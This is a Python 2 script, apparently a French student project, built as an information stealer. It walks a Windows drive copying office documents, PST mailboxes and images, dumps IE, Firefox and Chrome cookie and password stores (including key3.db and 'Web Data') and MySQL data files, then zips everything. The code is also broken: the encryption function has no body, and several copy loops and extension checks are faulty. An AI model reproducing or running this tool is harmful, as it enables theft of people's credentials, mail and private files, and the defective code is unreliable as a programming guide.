#!/usr/bin/env python27
# -*- coding: utf-8 -*-

# Projet annuel - Recherche d'information
# Version 2.0
# Nom du script: poplop.py


__author__="Maxime Savigny"

__date__="28/05/2016"


######################
#    IMPORT         #
######################

import argparse
import os, sys
import shutil, zipfile
import os.path
import glob
import subprocess
import getpass

######################
#      FONCTIONS     #
######################


class info_search():

    #Chemin ou sont stockes les fichiers dumpes
    #path_docs = 'E:\Pytest'

    #Debut de larborescence que lon veut lister 
    #Sous linux la racine est /
    #Sous windows chaque partition a sa racine (exemple C:\)
    #rootDir = 'C:\Users\%USERNAME%\Documents\Jesuistonpere' #C:\\

    def __init__(self):
        self.argParse()


    def argParse(self):

        #Creation du parser
        parser = argparse.ArgumentParser(description='Usage script info_search.py')
        #Ajout des options dans un groupe specifique
        options = parser.add_argument_group('options','')
        #Liste des options disponibles
        options.add_argument('-a', '--all', action="store_true", dest='all', default=False, help="Dump all files list in -f option")
        options.add_argument('-c', '--char', action="store", dest='char', type=str, default=False, help="Dump files by charactere of your choice")
        options.add_argument('-f','--format', action="store", dest='format', type=str, choices=['doc','docx','xls','xlsx','csv','ppt','pptx','txt','pst','jpg','png','pdf','vsd','vsdx','zip','rar'], default=False, help="Dump files of your choice")
        #options.add_argument('-p', '--password', action="store_true", default=False, dest='hash', help="Dump sam file (hash password)")
        options.add_argument('-b', '--browser', default=False, dest='browser', action="store_true", help="Dump browser cookies and passwords")
        options.add_argument('-d', '--db', default=False, dest='database', action="store_true", help="Dump database")
        options.add_argument('-e', '--encode', default=False, dest='encode', action='store_true', help='Encode archive contains all dump')


        #On parse les arguments
        args = parser.parse_args()

        self.all = args.all
        self.char = args.char
        self.format = args.format
        #self.hash = args.hash
        self.browser= args.browser
        self.database = args.database
        self.encode=args.encode

        #print args


    def parse_all(self):

        #Chemin ou sont stockes les fichiers dumpes
        path_docs = os.getcwd()
        #Debut de larborescence que lon veut lister 
        #Sous linux la racine est /
        #Sous windows chaque partition a sa racine (exemple C:\)
        username = getpass.getuser()
        #rootDir = 'C:\Users' + '\\' + username + '\Documents\Jesuistonpere' #C:\ Poue windows7
        #rootDir = 'C:\Documents and Settings'+ '\\' + username + '\My Documents\Jesuistonpere'
        rootDir = 'C:\\'
        
        for dirName, subdirList, fileList in os.walk(rootDir):

            #Ouverture du fichier "Directory_Tree.txt"
            fichier = open("Directory_Tree.txt", 'a')
            fichier.write('\n %s' % dirName)
            fichier.write('\n %s' % subdirList)
            fichier.write('\n %s' % fileList)
            fichier.write('\n *********************************************************************')                
            fichier.close()

            for file in fileList :

                try:
                    filename, extension = file.rsplit('.', 1)
                   
                    if extension == "docx" or extension == "doc":
                        #Copie des fichiers trouvees dans la destination qui va bien
                        shutil.copy2(dirName+'\\'+file, path_docs)
                    if extension == 'xls' or extension =='xlsx' or extension == 'csv':
                        #Copie des fichiers trouvees dans la destination qui va bien
                        shutil.copy2(dirName+'\\'+file, path_docs)
                    if extension == 'ppt' or extension == 'pptx':
                        #Copie des fichiers trouvees dans la destination qui va bien
                        shutil.copy2(dirName+'\\'+file, path_docs)
                    if extension == 'txt':
                        #Copie des fichiers trouvees dans la destination qui va bien
                        shutil.copy2(dirName+'\\'+file, path_docs)
                    if extension == 'pst':
                        #Copie des fichiers trouvees dans la destination qui va bien
                        shutil.copy2(dirName+'\\'+file, path_docs)
                    if extension == 'jpg' or extension == 'png':
                        #Copie des fichiers trouvees dans la destination qui va bien
                        shutil.copy2(dirName+'\\'+file, path_docs)
                    if extension == 'pdf':
                        #Copie des fichiers trouvees dans la destination qui va bien
                        shutil.copy2(dirName+'\\'+file, path_docs)
                    if extension == 'vsd' or extension == 'vsdx':
                        #Copie des fichiers trouvees dans la destination qui va bien
                        shutil.copy2(dirName+'\\'+file, path_docs)
                    if extension == 'zip' or extension == 'rar':
                        #Copie des fichiers trouvees dans la destination qui va bien
                        shutil.copy2(dirName+'\\'+file, path_docs)
                    elif extension != 'doc' or extension != 'docx' or extension != 'xls' or extension != 'xlsx' or extension != 'csv' or extension != 'ppt' or extension != 'pptx' or extension != 'txt' or extension != 'pst' or extension != 'jpg' or extension != 'png' or extension != 'pdf' or extension != 'vsd' or extension != 'vsdx' or extension != 'zip' or extension != 'rar':
                        break

                except:
                    #print("[ERROR] Split error")
                    break





        #print "Parse_all [OK]"


    def parse_with_char(self):

        #Chemin ou sont stockes les fichiers dumpes
        path_docs = os.getcwd()

        #Debut de larborescence que lon veut lister 
        #Sous linux la racine est /
        #Sous windows chaque partition a sa racine (exemple C:\)
        username = getpass.getuser()
        #rootDir = 'C:\Users' + '\\' + username + '\Documents\Jesuistonpere' #C:\\
        rootDir = 'C:\Documents and Settings'+ '\\' + username + '\My Documents\Jesuistonpere'

        #rootDir = 'C:\\'

        char_choice = glob.glob(str(self.char))
        for dirName, subdirList, fileList in os.walk(rootDir):
            #Ouverture du fichier "Directory_Tree.txt"
            fichier = open("Directory_Tree.txt", 'a')
            fichier.write('\n %s' % dirName)
            fichier.write('\n %s' % subdirList)
            fichier.write('\n %s' % fileList)
            fichier.write('\n *********************************************************************')                
            fichier.close()

            for file in fileList : 
                filename, extension = file.rsplit('.', 1)
                #print(extension)
                if filename == self.char:
                    #print("Copie de "+dirName+ '\\'+file+' vers '+path_docs)
                    shutil.copy2(dirName+'\\'+file, path_docs)


   

        #print "Parse_with_char [OK]"

    def parse_with_format(self):  
        
        #Chemin ou sont stockes les fichiers dumpes
        path_docs = os.getcwd()

        #Debut de larborescence que lon veut lister 
        #Sous linux la racine est /
        #Sous windows chaque partition a sa racine (exemple C:\)
        username = getpass.getuser()
        #rootDir = 'C:\Users' + '\\' + username + '\Documents\Jesuistonpere' #C:\\
        rootDir = 'C:\Documents and Settings'+ '\\' + username + '\My Documents\Jesuistonpere'
        #rootDir = 'C:\\'

        for dirName, subdirList, fileList in os.walk(rootDir):
            #Ouverture du fichier "Directory_Tree.txt"
            fichier = open("Directory_Tree.txt", 'a')
            fichier.write('\n %s' % dirName)
            fichier.write('\n %s' % subdirList)
            fichier.write('\n %s' % fileList)
            fichier.write('\n *********************************************************************')                
            fichier.close()
            for file in fileList : 
                filename, extension = file.rsplit('.', 1)
                if extension == self.format:
                    #print("Copie de "+dirName+ '\\'+file+' vers '+path_docs)
                    shutil.copy2(dirName+'\\'+file, path_docs)




    def dump_browser(self):

        #Chemin ou sont stockes les fichiers dumpes
        path_docs = os.getcwd()
        username = getpass.getuser()


        #####################
        ##### WINDOWS XP ####
        #####################

    ### IE ####

        path_ie_cookies = 'C:\Documents and Settings'+ '\\' + username + '\Cookies' 
        path_ie_mdp = 'C:\Documents and Settings'+ '\\' + username + '\Application Data\Microsoft\Credentials'
        
        #COOKIES
        for dirName, subdirList, fileList in os.walk(path_ie_cookies):
            for file in fileList :
                try:
                    shutil.copy2(file, path_docs)
                except:
                    break

        #MOTS DE PASSES
        for dirName, subdirList, fileList in os.walk(path_ie_mdp):
            for file in fileList :
                try:
                    shutil.copy2(file, path_docs)
                except:
                    break



    #### Firefox ####

        path_fi_cookies = 'C:\Documents and Settings'+ '\\' + username + '\Application Data\Mozilla\Firefox\Profiles\ytyz5ohr.default\cookies.sqlite'
        path_fi_mdp = 'C:\Documents and Settings'+ '\\' + username + '\Application Data\Mozilla\Firefox\Profiles\ytyz5ohr.default\key3.db'

        #COOKIES
        for dirName, subdirList, fileList in os.walk(path_fi_cookies):
            for file in fileList :
                try:
                    shutil.copy2(file, path_docs)
                except:
                    break

    
        #MOTS DE PASSE
        for dirName, subdirList, fileList in os.walk(path_fi_mdp):
            for file in fileList :
                try:
                    shutil.copy2(file, path_docs)
                except:
                    break






    #### Chrome ####

        path_ch_cookies = 'C:\Documents and Settings'+ '\\' + username + '\Cookies'
        path_ch_mdp = 'C:\Documents and Settings'+ '\\' + username + '\Application Data\Google\Chrome\User\Data\Default\Web Data'


        #COOKIES
        for dirName, subdirList, fileList in os.walk(path_ch_cookies):
            for file in fileList :
                try:
                    shutil.copy2(file, path_docs)
                except:
                    break

        #MOTS DE PASSE
        for dirName, subdirList, fileList in os.walk(path_ch_mdp):
            for file in fileList :
                try:
                    shutil.copy2(file, path_docs)
                except:
                    break



   


    def dump_database(self):

        #MySQL
        path_mysql = 'C:\Program Files\MySQL\MySQL Server 5.0\data\mysql'
        path_docs = os.getcwd()
        
        if bool(path_mysql) == True:
            try:
                for dirSQL, subdirSQL, fileSQL in os.walk(path_mysql):
                    for i in fileSQL:
                        #print(i)
                        try:
                            shutil.copy2(i, path_docs)
                        except:
                            print("")
            except:
                print("")        

    def archivage(self):

        #Chemin ou sont stockes les fichiers dumpes
        path_docs = os.getcwd()

        #Archivage
        fic_all = os.listdir(path_docs)
        zfile = zipfile.ZipFile('zipDump.zip','a')
        try:
            for i in fic_all:
                zfile.write(i)
                os.remove(i)
        

        finally:
            zfile.close()



    def fileEncrypt(self):

        #Ajouter l'encode de l'archive 




    def main(self):

        myinstance = info_search()
        if self.all == True and self.char == False and self.format == False:
            #print "all main [OK]"
            myinstance.parse_all()
        if bool(self.char) == True and self.all == False:
            #print "char main [OK]"
            myinstance.parse_with_char()
        if bool(self.format) == True and self.all == False:
            #print "format main [OK]"
            myinstance.parse_with_format()
        # elif self.hash == True:
        #     #print "hash main [OK]"
        #     myinstance.dump_pass()
        elif self.browser == True:
            #print "browser main [OK]"
            myinstance.dump_browser()
        elif self.database == True:
            #print "database main [OK]"
            myinstance.dump_database()


        elif self.all == False and self.char == False and self.format == False and self.browser == False and self.database == False:
            sys.exit()

            #and self.hash == False


        if self.all == True or bool(self.char) == True or bool(self.format) == True or self.browser == True or self.database == True:
            
            #and self.hash == True

            try:
                myinstance.archivage()
            except:
                sys.exit()




######################
#       MAINS        #
######################

#if __name__ == '__main__':

myinstanceglobal = info_search()
myinstanceglobal.main()


###Exception Out Of Syntaxe
##except NameError:
##    print("Choose a right choice")
##    continue
##except SyntaxError:
##    print("Choose a right choice")
##    continue
##except EOFError:
##    print("\nEntry 8 to exit programm")
##    continue
##except KeyboardInterrupt:
##    print("\nEntry 8 to exit programm")
##    continue
